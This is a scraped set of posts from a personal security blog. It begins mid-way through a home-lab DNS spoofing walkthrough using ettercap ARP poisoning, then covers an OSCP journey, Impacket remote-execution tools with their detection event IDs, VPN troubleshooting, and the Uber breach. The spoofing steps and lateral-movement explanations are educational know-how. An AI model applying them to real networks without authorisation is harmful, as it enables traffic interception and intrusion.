/etc/ettercap/etter.dns 6. Get the IP Address of the Victim Machine I use ipconfig to get the IPv4 address of the Windows VM.\n7. Run Ettercap On my Kali machine, I navigate to Applications \u0026gt; 09 — Sniffing \u0026amp; Spoofing \u0026gt; ettercap-graphical in order to open the ettercap GUI.\nIn the upper-right hand corner, I click on the three dots and navigate to Targets \u0026gt; Select targets.\nI have white theme right now, don’t judge\nI then enter the IP address of the victim machine and default gateway and press “OK”. The default gateway can also be found in the ifconfig/ipconfig command output of the victim machine.\nClick the Earth icon in the upper right-hand corner and select ARP poisoning.\nThe default setting is okay here.\nThen, click the three dots in the corner again. Go to Plugins \u0026gt; Manage plugins.\nSelect dns_spoof by double-clicking it. You’ll know that you’ve applied the plugin when the asterisk appears to the left of the plugin name.\n8. Visit The Domain on the Victim Machine Now, we reap the fruits of our labor.\nBefore This is the webpage that the victim to see when visiting ecosia.org:\nAfter This is the webpage that the victim machine sees when visiting ecosia.org:\nRemediation Here are some ways to prevent a DNS Cache Poisoning attack (referenced from here).\nUse spoofing detection tools Have a strong DNS, DHCP, and IPAM (DDI) strategy in place Use Domain Name System Security Extensions (DNSSEC). This essentially adds different levels of verification Use end-to-end encryption for DNS queries More Reading https://cybersecurity.att.com/blogs/security-essentials/dns-poisoning https://kinsta.com/blog/dns-poisoning/ Thanks for reading!\n","permalink":"https://ally-petitt.com/en/posts/2023-03-28_practical-demonstration--dns-spoofing---home-lab-f7294443fb23/","summary":"DNS Cache Poisoning on Home Lab Walkthrough https://www.okta.com/sites/default/files/media/image/2021-04/DNSPoisoning.png\nOverview In this article, I will be walking you through a common method of implementing DNS cache poisoning on a network. I’ll illustrate my process with screenshots, commands, and explanations. You are welcome to follow along and gain hands-on experience with DNS spoofing to further reinforce the knowledge that you already have.\nIntended Audience This is intended for a more technical audience. If you’re a beginner, I recommend looking for a more comprehensive tutorial to walk you through all the terminology and commands.","title":"Practical Demonstration: DNS Spoofing + Home Lab"},{"content":"Wait, you can do that? The answer is a resounding “yes”. And I’m not the only one who got my OSCP at the age of 16. Meet Mihai, Vanshal, Grant, and this person from Reddit. Admittedly, the number of us is few and far between when compared to the typical demographic of OSCP test-takers. To add to this, I’m a woman and I haven’t seen any other women my age do this. Still, people have done it and it possible.\nI present to you, the beautiful:\nhttps://www.credential.net/7370f6c4-31c5-4989-8612-90b600811813\nHow to Get Your OSCP as a Minor For those that are like me, or simply for the curious, the process is slightly different for minors. I contacted registrar@offensive-security.com and asked them for the registration steps as a minor. As a response, they requested that I send in my government-issued ID and a letter with my parent\u0026rsquo;s signature. I responded with these and they informed me that I was eligible to take the PEN-200. You must do this before buying the PEN-200.\nAs a note on money, I know that we’re probably broke high-school students and the cheapest option ($1499) is not very cheap. If you work at a job, your employer be willing to pay for the training, even if you don’t work in a position related to technology. There’s a slim chance you can convince the school to pay for it. If not, maybe family/friends can help, or you could do what I did and pay for it yourself with the money that you earn from a job/internship.\nAlso, it’s important that your parents/guardians are on board. They don’t have to be your biggest cheerleaders but make sure that they understand that this involves taking a 48-hour exam. If you’re doing this on a weekend, it could interfere with your sleep before school and it will be very beneficial for you to have a workspace to do the exam at that is free of distractions. Food is another concern and if they’re supportive enough to cook for you, that can be helpful. These are things that you may have to discuss with them, and I know that it can be hard to convince them if they don’t understand the value of an OSCP (or the cost of it). It’s just important to keep in mind that they ultimately have the last call in whether you are allowed to hack into computers for 24 hours instead of doing chores.\nI was lucky enough to have parents who didn’t understand but supported me as long as I was willing to pay for it on my own.\nMy OSCP Journey This will include my preparation, my mindset, and my exam/report experience.\nThis simple image is a summary of my OSCP timeline.\nMy Background I started from a bit of a unique position. Because of my (albeit inconsistent) work over the past 3 years, I had been able to establish a technical foundation in coding. I didn’t understand IT or networking, but I understood software. I began my journey with 1 1/2 years of experience as a software engineer in part-time internships throughout my first 2 years of high school. I can talk more about this in another post if people are interested because finding these internships was a vast challenge as a minor. This is not necessary by any means, but I do think that the background helped me. In particular, from this, I got comfortable reading documentation, understanding/writing code, and troubleshooting.\nThe Beginning My cybersecurity journey started out in late December of 2021 with a TryHackMe course on networking. It began with the fundamental question of how information can travel from one device to the next. Why is it that I can send a message to my mother’s phone without ever having physical interaction with it? And I also wondered about hacking, and, in particular, what it truly looked like.\nMy journey started out of pure curiosity.\nI went through the modules and then didn’t touch TryHackMe again, or anything cybersecurity-related, for another 2 months. I was at an internship at a startup on top of school, which was already exhausting. I knew that doing any more would lead me to burn out.\nWhen my internship ended, I had more free time. I recall using TryHackMe for about 1–2 hours per week in February and March of 2022. But my main focus was finding another software engineering internship because I wanted more experience before I graduated high school. At this point, I didn’t take cybersecurity seriously and I didn’t have the skill to do much relating to it.\nAround April of 2022, I started to passively do more TryHackMe alongside my new internship. At this point, I became deeply passionate about understanding the way that the devices worked. The idea of being able to outsmart the way that something functions so as to make it do something it wasn’t intended to do really appealed to me. It was the intellectual challenge that I craved and allowed me the freedom to think creatively. I began to understand the world better from what the modem down the hall does to how my school account works.\nGetting More Focused The summer of 2022 was by far my most prolific period of learning throughout this journey. I watched countless YouTube videos, read numerous research blogs, and just fell in love with this community of diverse thinkers. It’s fascinating the way that cybersecurity folks will use their beautiful brains to challenge their surroundings. I found a video of a guy hacking his car, I learned about the Flipper Zero, and the WiFi Pineapple. Each of these surprised me in the most astonishing way because I didn’t know that these feats and gadgets were possible!\nThis strengthened my passion for cybersecurity and I began following closely to IppSec. I couldn’t do HackTheBox machines without help from a walkthrough. By the way, HackTheBox is hard! Those machines are way more difficult than the OSCP! If you can’t do them, don’t fret. It takes practice and patience over a long-enough period of time. And that timeline will be different for each person.\nI also took this time to learn basic networking and IT from this extremely helpful channel and did some experiments on my home network.\nEnrolling in the PEN-200 This was a big step for me. I was unsure of whether I was skilled enough to get started. By this point, I was able to do some of the HTB boxes on TJ Null’s list without referencing a writeup. Getting this course was a big purchase and I didn’t want to waste my money.\nI ended up being disappointed with the course. I was hoping for better explanations and the topic exercises didn’t work about 10% of the time which prevented me from getting bonus points. In addition, before I knew about the topic exercises, I tried writing the lab report just to find out it wasn’t accepted after January 2023 for bonus points, so I wasted 1 1/2 months writing 400 pages when I could have instead been learning skills that would actually transfer to the OSCP.\nThe labs weren’t very valuable to me with the exception of the AD networks and the IT network that required pivoting to get to. These two allowed me to practice port-forwarding and AD methodology in a way that was meaningful and transferrable.\nAfter about 2 months, of the PEN-200, I left to find better labs in Proving Grounds. I started by following TJ Null’s list, and then I switched to doing the ones that weren’t listed since I finished the list. It was also around this time that I got really interested in anonymity. So I spent the first week of my Christmas break learning about anonymity. I went on a number of other research tangents throughout my journey. I realized that I had trouble sustaining my OSCP journey without taking the time to explore other topics that interested me, so it was a common occurrence for me to shift my focus away from the OSCP every few weeks to learn something else.\nExam Month Woman who is stressed for her dear life\nIn the month leading up to the exam, I had reached a point of exhaustion. I experienced stress from several areas of my life at once and came to the conclusion that if I wanted to do well on my exam, de-stressing was my top priority. At this point, I had compromised over 200 lab machines total. I had the skill, I had my notes, and I had intuition. The final month wasn’t going to make a difference. I was already ready.\nAs a result, I spent this time reading books about anthropology, neuroscience, and history. I went to the gym and socialized with friends at school I created more free time for myself and did what I needed to relax while also keeping my thinking skills sharp.\nI did about 1 PG machine per week. For each one of these, I made a focused effort to practice thorough note-taking and I would write an example report on it.\nI scheduled my exam about 2 weeks prior to the exam date. Waiting until so late meant that the only time available for me was 4:00 AM. I reserved this time knowing I would be able to wake up from the adrenaline rush.\nExam Day I woke up at 12:30 AM. I think the excitement woke me up because I was unable to fall asleep. I went to sleep at 8:00 PM the night before, hoping to wake up at 3:15 AM. It turned out that I didn’t even need to set an alarm that day!\nThis wasn’t ideal because I had about 3 less hours of sleep than planned. I was still able to make it work, however. I logged on to the proctoring software at 3:45. After walking through the pre-exam checks, I was able to connect to my VPN at 4:00 AM.\nHere is a quick timeline of my test since this is already getting lengthy:\n4:00 AM (0pts)- Use RustScan to scan all the hosts and become familiar with my exam dashboard. 4:10 AM (0pts)- Start enumerating the first AD machine. I didn’t find anything useful so I moved on temporarily. 4:40 AM (0pts)- Start enumerating one of the individual machines. I figure out what I need to do. 4:55 AM (10pts)- Submit my first local.txt and try to privesc. 5:10 AM (10pts)- Don’t find a quick privesc, so start looking at second independent target. It takes about 20 more minutes, but I find what I need. 5:46 AM (20pts)- Got a shell and submitted second local.txt. 5:46–6:10 AM (20pts)- Take a break. 6:10 AM (20pts)- Enumerate domain controller. At this point, I’m getting really deep into enumeration and finding nothing. 8:30 AM (20pts)- Shift focus on 3rd independent target. 9:20 AM (20pts)- Found potential vulnerabilities, but wasn’t able to exploit them. Tried privesc on 1st independent target again. 10:20 AM (20pts)- Discovered interesting findings. Unable to use them for an exploit. Moved to AD machine. 11:20 AM (20pts)- Thorough enumeration, but didn’t find what I needed. I’m starting to get anxious. 11:20–11:50 AM (20pts)- Take a break. By this point, I was starting to lose my cool. I had been awake for nearly 12 hours on insufficient sleep. I went on a walk to clear my mind and brainstorm new enumeration ideas. With my list in mind, I returned to the exam desk:\n11:50 AM (20pts)- Enumerate AD machine more with new ideas. 1:30 PM (20pts)- Still no progress. Briefly contemplate giving up, but decide to keep going (read more about this in next section). 3:00 PM (20pts)- Take a nap. Struggle to sleep because of excitement, but eventually relax. Completely exhausted from my enumeration efforts and lack of adequate sleep. 4:30 PM (20pts)- Wake up and continue searching AD machine. This time with more of a focus on thorough, methodical, and manual enumeration. 5:00 PM (20pts)- Find the missing piece! 5:30 PM (20pts)- Successfully exploit first AD machine! 6:30 PM (20pts)- Escalate privileges and get proof.txt. Take a short break to cry tears of joy. 7:00 PM (20pts)- Encountering difficulties with getting one of my tools to work the way it normally does. 8:00 PM (20pts)- I found the solution to my problem after a lot of troubleshooting and continued to move forward. 8:30–8:50 PM (20pts)- Take a break. 9:05 PM (20pts)- Move laterally to 2nd AD machine and get proof.txt. 9:31 PM (60pts)- Privesc to 3rd AD machine as domain admin. Got proof.txt! At this point, I was in utter disbelief that I had actually done it. I took a break from the exam to go tell my mom how I was able to do it. I said, “This all started out as a naive dream that I had last April and I didn’t think it would actually happen. I went for it anyways, and now it’s actually coming true.”\nNow, I had the final task of scoring 10 more points before I was eligible to pass. I started by trying to get a foothold on independent target #3, but continue to fail. I go for the privesc on the 1st independent target, but hit numerous dead ends.\n11:30 PM (60pts)- Shift focus to privesc on 2nd independent target, the one I thought I was least likely to get. My enumeration scripts weren’t working and I didn’t find much in my initial manual enumeration. Then, I went through my notes and tried each enumeration step one-by-one. 11:50 PM (60pts)- Discover a vulnerability that allowed me to privesc from a check that I almost didn’t include in my notes. I figured out how to exploit it and attempted it with the expectation that it would fail since I had been failing for the past 3 hours. 11:55 PM (70pts)- The exploit succeeds and I can’t believe that I just scored 70 points! My jaw is dropped as I stare at my terminal output. The feeling that I experienced in this moment is indescribable. My best attempt at illustrating the way that I felt is runner’s high… on a high. I had never felt so uplifted and energetic. This moment made the preceding hours of banging my head against the keyboard worth it. I take a break and just allow myself the time to appreciate that moment before continuing\n12:30 AM (70pts)- Do more enumeration on 3rd independent target to see if I can get an easy foothold. Realize how exhausted I am and check that I did an adequate job at screenshots and note-taking. 1:10 AM-iss (70pts)- End exam early after verifying I had all the documentation I needed to write a good report I made the difficult decision to end my exam at 70 points, knowing that any mistake I made in reporting, proof screenshots, or flag submission would result in a fail. After triple-checking that my notes were thorough and that my screenshots/flag submissions met the exam requirements, I asked my proctor to end the exam early. I chose to do this for two reasons:\nI would rather spend the last 3 hours of exam time sleeping since I knew I had a report to write the next day that required strong mental focus. If I were to compromise another machine, I would have to add it to my report, which would just make a job the next day more difficult. Combined, I would have less sleep and more work for the next day. I decided that, ultimately, for me to write a great report tomorrow, I needed the sleep. So I sacrificed the potential extra points for the security that I would have the brain power to make the most beautiful report of my life.\nI also do want to mention that I was taking thorough notes and screenshots throughout my exam time just like I had practiced doing. I didn’t have to retrace my steps in order to ensure I had good notes because I had developed good documentation skills before the exam.\nI do want to note that I left out many of the breaks that I took just for the sake of brevity. I probably did take a break every 50 minutes on average. Most of them were only 5 minutes, some were 30.\nDon’t Give Up I do want to touch on 1:30 AM. I did genuinely consider quitting. I had previously failed the eJPT exam last July, so part of me figured that I was destined to fail this one as well. Before I allowed myself to spiral, I reconsidered what it cost me to be able to have that moment. I thought about the money that I spent, the hours I took to prepare, and the people who believed in me. I made an agreement with myself:\nI told myself that it was okay to fail. As long as I failed knowing that I did everything I possibly could to succeed.\nSo in order to appease my own mind and fail this exam regret-free, I continued. Ironically, it was my willingness to fail that allowed me to succeed. My stress levels decreased and I was able to actually get some sleep. After my nap, I compromised the first AD machine!\nYou’ll Run Out of Ideas Before You Run Out of Time The reason I was able to compromise the first AD machine after 12 hours of being stuck is this: I kept coming up with new ideas. Even if there’s a 1% chance of it working, when you have 100 of those ideas, one of them is bound to be it!\nChannel your inner child and keep asking questions and experimenting with ideas, even if you think it won’t work. Most ideas will probably fail, but all you need is one success.\nReporting I could make a dedicated article just on this topic. To summarize, I cross-referenced multiple templates that I found online and figured out what my report should look like. I then used the template that I thought was the most aesthetic and modified it to fit my needs.\nI took pride in the report I created because I was very meticulous about my word choice, adhering to the documentation requirements, maintaining a consistent diction, explaining concepts clearly and accurately, and providing adequate screenshots.\nI submitted my report after triple-checking that it was perfect and re-reading it countless times. Then, the wait ensued.\nA man hopelessly staring at the clock\nThe Aftermath This exam left me exhausted. I was very sleep deprived, fatigued, and anxious. It takes a significant amount of mental energy to maintain such intense attention to detail for a prolonged period of time. Throughout the exam period, I had a constant rush of adrenaline. And this made it near impossible to fall asleep. After I had submitted my report, I had to next most difficult part of the OSCP: the wait. Luckily, it only took 25 hours for me to get the email that I passed. Each of those 25 hours, I made sure to refresh my inbox every 30 seconds (optional step).\nI do want to mention that this exam also takes a physical toll. Sitting at a desk for so many hours, even with breaks, is hard on the body. Make sure to move, stretch, and hydrate. I felt stiff in the few days following the exam.\nFor the next few days, I felt a lightness and joy knowing that all of my hard work had paid off. That I had dared to try something so ambitious and unrealistic and it actually worked. This was a major accomplishment for me that required overcoming countless challenges.\nTakeaways The OSCP was much more than a test of technical ability. It was an assessment of organizational skills, time management, resourcefulness, troubleshooting, problem-solving ability, capacity to work under stress, and much more. There was a point during the exam when BurpSuite wasn’t working for me, so I had to improvise in order to figure out a different solution. There were points where I almost went down rabbit holes searching for something that didn’t exist. It really takes experience to realize when these things are happening and how to adapt.\nAdditionally, working under that time constraint with a proctor watching my every move through the webcam was stressful. I also had to make sure I had standards for taking good notes, I had my systems for organizing the log files that I collected, a way to organize my screenshots, I knew the sections and layout of my report, etc.. A failure to do any of these would result in time being wasted, and with such a strict time constraint, there wasn’t much room for error.\nWas it worth it? The short answer is that I don’t know yet. It’s really hard to find cybersecurity work in general as a minor, but I think that having this certification demonstrates my skill and for the few opportunities that do exist, I’ll be more likely to actually get them.\nIt’s worth noting that when people who know me think about cybersecurity, I’m the first person who comes to mind, which can help in creating more opportunities through word-of-mouth. Additionally, I am more respected by the adults and peers who understand what the OSCP is. When I’m networking, people are more interested in learning about me and working with me than before I was certified now that I have something tangible to back up my skill.\nAccomplishing this in high school is a pretty remarkable feat, and people in the industry realize this and respect it. It’s impressive and can help get your foot in the door in combination with other factors such as networking, education, and other experiences/projects. The closer that you get to becoming a legal adult, the more valuable the OSCP becomes in terms of career opportunities, although accomplishing it younger definitely stands out. It’s really a personal decision for you to make based on your situation, limitations, and values.\nImposter Syndrome As an update from future me, I would like to briefly mention my struggles with self-esteem following this exam. I set my mind to achieving this certification and diligently spent months preparing for it, but now that I’ve done it, I’ve noticed that I feel even less competent in my own abilities. I’ve continued to learn more and realized just how little I actually know. I’ve convinced myself that I just got lucky in achieving the OSCP and that I didn’t actually earn it.\nIn the days following the exam, I felt amazing. But in the weeks following the exam, I felt degraded. And honestly, the doors that I thought would open for me just didn’t. I do realize that this is a massive achievement and logically, I truly have developed the mental and technical skills necessary to achieve this, but I also feel the need to work even harder to learn more and prove myself. I put unrealistically high expectations on myself at such a young age and it’s quite overwhelming. It’s like the Dunning-Kruger effect taken to the extreme.\nFrom what I’ve read, imposter syndrome is very common among people in this field, so I take it that I’m not unique in the sense of feeling worse after the OSCP. Despite this, however, I do not regret going for this certification. I’m so glad that I did. I think that imposter syndrome will be a long-term struggle for me going forward.\nIn honesty, there’ve been times when I thought about quitting because the pressures that I would put on myself would be so extreme. I think that I would face this struggle in any career I enter just due to my personality. Everyone that knows me personally has told me that I will be successful and high-achieving. Somehow, I’ve convinced myself that I am not good/smart enough to accomplish these things and that is really sad. I think that this will get better, though, because I’ve discovered some things that have worked for me in the past. Until then, this has been my experience following the exam.\nNext Steps I’m still deciding on the best ways to allocate my time, but I’m considering doing some combination of these things (subject to change):\nContributing more to open-source projects Creating my own cybersecurity coding projects/tools Speaking at a cybersecurity conference Strengthening my web application security skills Attempt bug bounty hunting Expanding my network and looking for more opportunities I’m looking to improve both my hard and soft skills while going to high-school full-time. Moving forward, I would like to share more of my journey and hopefully help to strengthen a community of young professionals such as myself.\nIf you have any questions, my inbox is open. Please reach out to allypetitt@gmail.com. Thanks for reading!\n","permalink":"https://ally-petitt.com/en/posts/2023-03-19_how-i-got-my-oscp-at-16-years-old-50ed402d6fd1/","summary":"Wait, you can do that? The answer is a resounding “yes”. And I’m not the only one who got my OSCP at the age of 16. Meet Mihai, Vanshal, Grant, and this person from Reddit. Admittedly, the number of us is few and far between when compared to the typical demographic of OSCP test-takers. To add to this, I’m a woman and I haven’t seen any other women my age do this.","title":"How I got my OSCP at 16 years old"},{"content":" https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress\u0026amp;cs=tinysrgb\u0026amp;w=1260\u0026amp;h=750\u0026amp;dpr=1\nIf you’re anything like me, you discovered Impacket, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.\nPsExec PsExec works by writing a randomly-named binary to the ADMIN$ SMB share (hence why you require write access to that share in order to use it). The binary establishes a named pipe that is used by the SVCManager to create a new service. This named pipe can be used by the user to execute commands remotely. You can imagine the binary as executing the following command:\nsc create [serviceName] binPath= \u0026#34;C:\\Windows\\[uploaded-binary].exe\u0026#34; All of your command input and output occurs over the named pipe via SMB (445/TCP).\nAs pointed out by Jeremy Dupuis, PsExec leaves artifacts behind that require manual cleaning as the binary that is uploaded is not automatically removed. In fact, this is what the error logs look like after he ran a single command on PsExec before exiting.\nhttps://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sys.png\nhttps://jb05s.github.io/images/attacking-windows-impacket/psexec-eventlog-sec.png\nAs you can see, the logs showed:\n1 System Event IDs: 7045 (Service Started) 12 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff) SmbExec- the next logical step SmbExec works similarly to PsExec. The main difference is that PsExec will upload a .exe file to the ADMIN$ share while SmbExec uploads a .bin file along with a temporary file.\nIf you’re interested in learning how to replicate this manually, HackTricks has a section demonstrating how to do so.\nReferencing the images from Jeremy Dupuis, we can see the log output for establishing a connection via SmbExec, executing one command, and exiting.\nhttps://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs.png\nhttps://jb05s.github.io/images/attacking-windows-impacket/smbexec-eventlogs-sec.png\nThe resulting logs are:\n4 System Event IDs: 7045 (Service Started), 7009 (Service Error — Timeout) 3 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff) Wmiexec \u0026gt; Psexec? WMIexec works via Windows Management Instrumentation (WMI). WMI works by negotiating a random port (\u0026gt;1024) with the client over an initial connection to RCP (135/TCP). WMI and RPC are commonly used for network administration, so it is common for the ports to be open and unfiltered on an internal network.\nThe user sends input to the remote host over the random port. The input is executed with cmd.exe and the output is written to a file in the ADMIN$ SMB share. The filename starts with __, followed by the timestamp.\nThe advantage to this method is that it allows us to execute code without writing on the disk or creating a new system. The result is a lowered chance of detection by Windows Security Essentials and Bit9, for instance.\nIn addition, you can utilize WMI for remote access via the program pth-wmis which comes preinstalled with Kali Linux.\nAgain, we can view the log output of a connection, executing a single command, and exiting as demonstrated by Jeremy Dupuis.\nhttps://jb05s.github.io/images/attacking-windows-impacket/wmiexec-eventlogs.png\nThe result is:\n14 Security Event IDs: 4672 (Special Privilege Logon), 4624 (Logon), 4634 (Logoff) If you’re interested in learning more about WmiExec, this article goes into detail about how it works on a low level and how it is detected.\nAtExec This program works by remotely executing scheduled tasks on a remote target through RCP. It creates a scheduled task via the Task Schedule Service. The task is executed with cmd.exe and the output of the command (STDERRand STDERR) is written in a temporary file in the ADMIN$ SMB share. AtExec retrieves the value of this file before deleting it.\nDcomExec This program uses the Distributed Component Object Model (DCOM) protocol. DCOM is a protocol that relies heavily on RPC to help software components communicate on networked computers. It has the same user interface as PsExec, and works as explained here:\nDcomexec uses the MMC20 Application (which is accessible over the network with authentication) and its ExecuteShellCommand method to execute arbitrary commands. It also supports using the ShellWindows application and the ShellBrowserWindow applications.\nTLDR; PsExec works over SMB by uploading a .exe file that creates a named pipe between you and the remote host SmbExec works similarly, except instead of a .exe file, it uses a .bin file. WmiExec uses the Windows Management Instrumentation service to sent input to the host and output is written to a file in SMB. AtExec works through executing scheduled tasks in SMB DcomExec uses the DCOM protocol with RPC to execute commands They all look different in logs I hope you learned something because I certainly did.\nReferences Attacking Windows: Performing Lateral Movement with Impacket https://www.trustedsec.com/blog/no_psexec_needed/ https://book.hacktricks.xyz/windows-hardening/lateral-movement/smbexec https://www.crowdstrike.com/blog/how-to-detect-and-prevent-impackets-wmiexec/ https://kylemistele.medium.com/impacket-deep-dives-vol-1-command-execution-abb0144a351d Other “exec” tools that you can learn more about ScExec MsiExec ","permalink":"https://ally-petitt.com/en/posts/2022-12-09_windows-remoting--difference-between-psexec--wmiexec--atexec---exec-bf7d1edb5986/","summary":"https://images.pexels.com/photos/3760778/pexels-photo-3760778.jpeg?auto=compress\u0026amp;cs=tinysrgb\u0026amp;w=1260\u0026amp;h=750\u0026amp;dpr=1\nIf you’re anything like me, you discovered Impacket, either through a course, Ippsec, or your own research, and you look at the scripts. Your grin turns into horror as you realize the sheer amount of scripts that end with “exec”. They all give you remote access but when do you use which one!? Don’t worry, I have your back. Let’s break them down.\nPsExec PsExec works by writing a randomly-named binary to the ADMIN$ SMB share (hence why you require write access to that share in order to use it).","title":"Windows Remoting: Difference between psexec, wmiexec, atexec, *exec"},{"content":"If your VPN log looks something like this:\nI’m here to help. During my time working through the PEN-200 labs, I’ve faced the constant struggle of losing connection to the host every few minutes to seconds. I tried to troubleshoot this “Inactivity Timeout” error with an Offsec employee for 3 hours to no avail. Finally, I figured out the solution and I am here to share it with those of you who have the same struggle.\nCause of This Error In a successful OpenVPN connection, the VPN server will send pings to the client to ensure that the VPN connection is still active. If the ping is not received by the client, the server knows that the VPN is disconnected and attempts to reset the connection. This is when the message “Inactivity timeout ( — ping-restart)” appears in the VPN log.\nReason #1: Firewalls A potential cause for this error, which is often overlooked, is a running firewall. This was the primary reason that I was seeing the errors as I was unaware that my firewall was interfering with the VPN connection, and I had another firewall that I didn’t know was running. Linux users, you can check the firewall status with the following commands:\nsudo systemctl status ufw sudo systemctl status firewalld If the firewall is running, it is possible that this is the reason you are having VPN issues. To fix this, either disable the firewall or change its configuration to not interfere with your VPN connection.\nReason #2: Multiple VPN connections at once Another possible cause of this error is when running two openvpn clients with the same profile from different computers. Make sure that you’re not running the VPN in your virtual machine and host OS at the same time. If your setup looks something like this:\nThere’s a chance that this is the reason for your troubles. To solve this, pick one VM to work in and kill any of your other VPN connections. You can use this command in the terminal to ensure that openvpn is no longer running.\nkillall -e openvpn Reason #3: DNS Name Resolution Additionally, if running ping [www.google.com](http://www.google.como) results in the message:\nYou probably need to add a working nameserver to your **/etc/resolv.conf** file. For example, your /etc/resolve.con may look like this once you add the working nameservers:\nNote: 1.1.1.1 is the public DNS resolver from Cloudflare and 8.8.8.8 is from Google. For more details regarding configuration, look at this article.\nReasons #4–12 These are additional reasons that I found in this article.\nAddress or port of VPN server is incorrect VPN server is offline Network between your computer and the server dropped out The ping and ping-restart values are invalid or don’t match Configuration problems Your country may attempt to take down your VPN connection for censorship purposes NAT router that blocks your connection Firewall on your router Additional Reading https://www.sparklabs.com/support/kb/article/error-inactivity-timeout-ping-restart/ ","permalink":"https://ally-petitt.com/en/posts/2022-11-12_vpn-troubleshooting--inactivity-timeout-----ping-restart--a52791c24a50/","summary":"If your VPN log looks something like this:\nI’m here to help. During my time working through the PEN-200 labs, I’ve faced the constant struggle of losing connection to the host every few minutes to seconds. I tried to troubleshoot this “Inactivity Timeout” error with an Offsec employee for 3 hours to no avail. Finally, I figured out the solution and I am here to share it with those of you who have the same struggle.","title":"VPN Troubleshooting: How to fix “Inactivity Timeout ( — ping-restart)”"},{"content":"The Pen-200 is the prerequisite course for the OSCP exam. As such, the writeups for the labs are incredibly difficult to find. As someone who has relied heavily on the accessibility of HTB walkthroughs, I’ve never been in an environment where I wasn’t one Google search away from figuring out the next step in solving a box. Needless to say, 0xdf couldn’t help me much with the Pen-200 labs.\nThe Pen-200 labs were a struggle not because I was incompetent, but because I didn’t have enough practice reaching dead ends. I didn’t spend enough time in rabbit holes, therefore I wouldn’t realize when I was in one. I didn’t know how to search for details that I might have missed on my first look. When trying to solve a box, I learned that sometimes the vulnerability could be found just by Googling a word that I was not entirely familiar with on thenmap scan.\nMy journey began with referencing writeups on HTB, but when I no longer could, I learned how to use cheatsheets on the internet. Some of my most notable mentions are HackTricks and Kashz Jewels. When I found an open port, I would ensure that I went through every enumeration step that I found on these cheat sheets. It was still a slight crutch, but it did allow me to develop methodologies that I wasn’t getting by relying solely on writeups.\nEventually, thoroughly enumerating the services became second nature and I became better at quickly identifying vulnerabilities in the virtual machines. I learned to search for CVEs for any software that I found running and I learned to do more thorough experimentation with user input fields and query parameters. I learned how to troubleshoot the errors that I was getting on my system when trying to run an exploit.\nI am feeling very confident in my abilities to hack into the lab systems and am beginning to look towards something more challenging such as Proving Grounds in preparation for the OSCP.\nKey Takeaways This process of feeling helpless with gradual progress towards becoming self-reliant and resourceful has taught me an important lesson about cybersecurity which is this: methodology is key. Methodology might be the single largest difference in my pen-testing abilities before and after the Pen-200. I learned how to consistently find vulnerabilities and how to reliably exploit them. And methodology is best developed through repetition and exposing yourself to a variety of different machines. Each one requires a slightly different approach which creates a more complete methodology.\nIn addition, note-taking is powerful. Taking frequent screenshots and saving the output of scans into a file will save time when wanting to look back at scan results and it will allow for further refinement of your methodology.\n","permalink":"https://ally-petitt.com/en/posts/2022-11-02_what-the-pen-200-has-taught-me-about-pentesting-methodology-1fd67760be5c/","summary":"The Pen-200 is the prerequisite course for the OSCP exam. As such, the writeups for the labs are incredibly difficult to find. As someone who has relied heavily on the accessibility of HTB walkthroughs, I’ve never been in an environment where I wasn’t one Google search away from figuring out the next step in solving a box. Needless to say, 0xdf couldn’t help me much with the Pen-200 labs.\nThe Pen-200 labs were a struggle not because I was incompetent, but because I didn’t have enough practice reaching dead ends.","title":"What the Pen-200 Has Taught Me About Pentesting Methodology"},{"content":" An 18-year-old hacker gained admin access to Uber on September 15, 2022. These are the steps that the hacker took:\nThe hacker obtained an Uber employee’s phone number. He directed the employee to a phishing site that looked like an Uber login page. The employee logged in and the hacker gained his credentials. The hacker tried to get around the MFA by doing a Multi-Factor Authentication Fatigue attack. This attack consists of spamming MFA requests to the employee until he gets annoyed enough to allow the login attempt to go through. He continued the attack for over an hour before changing tactics. He contacted the employee on WhatsApp claiming to be on the IT team. He said that in order for the spamming to stop, he must accept the request. The employee accepted the request and the hacker gained access to the network. The hacker found network shares with PowerShell scripts that contained hard-coded admin credentials. The hacker used the username and password of the admin to gain access to Amazon Web Services (AWS), GSuite, DA, DUO, OneLogin, Uber security dashboards, and their financial data. He continued to vandalize reports on Uber’s HackerOne bug bounty program before declaring his presence in Uber’s Slack workspace. The hacker leaked screenshots of the Google Admin panel, Avengers dashboard, security dashboards, and their AWS IAM summary.\nAftermath Uber’s stock prices dropped by 6% following the day of the breach, lowering its valuation by over $2 billion. The stock prices did eventually recover. Uber responded with a tweet on their PR Twitter account.\nUber followed up by stating that there was no evidence of sensitive user data being stolen, they have notified authorities, and their internal and external applications are operational.\nThey also created a “Security Updates” page on their Uber Newsroom where they make posts about the developments in their investigation.\nShifting blame Uber tried to shift the blame towards Lapsus$, an international hacker group that has conducted cyberattacks against large companies and government organizations such as Ubisoft, Nivida, Samsung, and Brazil’s Ministry of Health. It is speculated that Uber is attempting to make their hack less embarrassing by claiming it was done by a more elite organization.\nMost Embarrassing Hack Ever? This hack could have been completely avoided had better cybersecurity practices been instilled in Uber. Hard-coded credentials are among the 2022 CWE top 25 most dangerous software weaknesses. Any cybersecurity professional should be aware of the risk that is involved in having hard-coded credentials in an accessible share. In addition, the employee should not have had access to these sensitive network shares. This goes against the fundamental cybersecurity principle of least privilege. This hack is a learning opportunity of how important the fundamentals are when establishing cybersecurity in an organization.\n","permalink":"https://ally-petitt.com/en/posts/2022-09-24_how-did-an-18-year-old-hack-uber--788f092b9dc3/","summary":"An 18-year-old hacker gained admin access to Uber on September 15, 2022. These are the steps that the hacker took:\nThe hacker obtained an Uber employee’s phone number. He directed the employee to a phishing site that looked like an Uber login page. The employee logged in and the hacker gained his credentials. The hacker tried to get around the MFA by doing a Multi-Factor Authentication Fatigue attack. This attack consists of spamming MFA requests to the employee until he gets annoyed enough to allow the login attempt to go through.","title":"How Did an 18-Year-Old Hack Uber?"},{"content":" Introduction This article contains information that I have gathered as I’ve done research on incident response. This aims to be actionable for red teamers to know what to look out for and for blue teamers to aid in the creation of an effective incident response plan.\nKey Roles the CISO ensures cyberattacks are promptly investigated.\ncoordinating efforts of incident response during a 